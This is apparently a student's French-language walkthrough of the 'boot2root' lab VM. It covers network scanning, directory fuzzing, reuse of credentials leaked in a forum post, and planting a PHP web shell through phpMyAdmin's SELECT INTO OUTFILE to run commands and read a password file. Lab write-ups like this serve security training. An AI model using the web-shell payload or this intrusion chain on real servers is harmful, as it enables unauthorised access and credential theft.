setting VM
    network
        NAT
        Host-only Adapter 

Dans un terminal :
    ifconfig
        vboxnet0: flags=8943<UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
            ether 0a:00:27:00:00:00
            inet 192.168.56.1 netmask 0xffffff00 broadcast 192.168.56.255

    nmap '192.168.56.*'
        Nmap scan report for 192.168.56.101
        Host is up (0.00087s latency).
        Not shown: 994 closed ports
        PORT    STATE SERVICE
        21/tcp  open  ftp
        22/tcp  open  ssh
        80/tcp  open  http
        143/tcp open  imap
        443/tcp open  https
        993/tcp open  imaps

Dans le navigateur :
    192.168.56.101

Le but était d'avoir la liste de toutes les pages trouvable sur l'adresse IP.
Dans Kali :
    (VM config : NAT Network + Host-only adapter) 
    //dpkg-reconfigure openssh-server
    //systemctl start ssh.socket
        dirb https://192.168.56.101 
    ou
        wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 https://192.168.56.101/FUZZ
            /phpmyadmin
            /forum
            /webmail
        wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 https://192.168.56.101/forum/FUZZ
            /includes
            /js
            /modules
            /update
            /images
            /index
            /templates_c
            /backup (403)
            /config (403)
    
    //scp root@192.168.56.102:./Desktop/myfile ./project/boot2root

https://192.168.56.101/forum :
    dans le post "Probleme login ?" de lmezard
        Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 
    connection au forum avec
        lmezard : !q\]Ej?*5K5cy*AJ
    dans le profil de lmezard :
        laurie@borntosec.net

https://192.168.56.101/webmail:
    connection avec laurie@borntosec.net : !q\]Ej?*5K5cy*AJ
    dans le mail DB Access
        root/Fg-'kKXBj87E:aJ$

https://192.168.56.101/phpmyadmin:
    connection avec root : Fg-'kKXBj87E:aJ$

Le but du script suivant est de pouvoir exécuter une commande sur le server depuis phpmyadmin.
Après plusieurs essais, nous avons découvert que que nous avions les droits de lecture et d'écriture sur le dossier /var/www/forum/templates_c,
ce qui nous a permis d'executer le script en donnant son chemin relatif en tant qu'url ( /var/www/forum/templates_c/index.php == base_uri/forum/templates_c/index.php )

Dans le champ SQL de phpmyadmin :
    SELECT `content`
    FROM `mlf2_pages`
    WHERE id = 1
    INTO OUTFILE "/var/www/forum/templates_c/index.php"

Nous devons écrire dans tout les champs texte de la database :

```sql

    INSERT INTO
        `mlf2_pages`
        (
            `order_id`,
            `title`,
            `content`,
            `menu_linkname`,
            `access`
        )
    VALUES
        (
            0,
            "",
            '<? echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>',
            "",
            0
        )
```

Puis ecrire dans un fichier :
(Si nécessaire remplacer l'id)

```sql

    SELECT
        `content`
    FROM
        `mlf2_pages`
    WHERE
        id = 1
    INTO OUTFILE
        "/var/www/forum/templates_c/index.php"
```

Nous pouvons maintenant accèder à la page :
    base_uri/forum/template_c/index.php?cmd=any command
    https://192.168.56.101/forum/templates_c/index.php?cmd=ls%20-R%20../../

    ```
    $> curl "https://192.168.56.101/forum/templates_c/index.php?cmd=cat%20/home/LOOKATME/password" -k
        <pre>lmezard:G!@M6f4Eatau{sF"
            </pre>
    ```

Le login et le mot de passe nous permettent d'accèder au ftp :
    ftp lmezard@192.168.56.101
    password : G!@M6f4Eatau{sF"

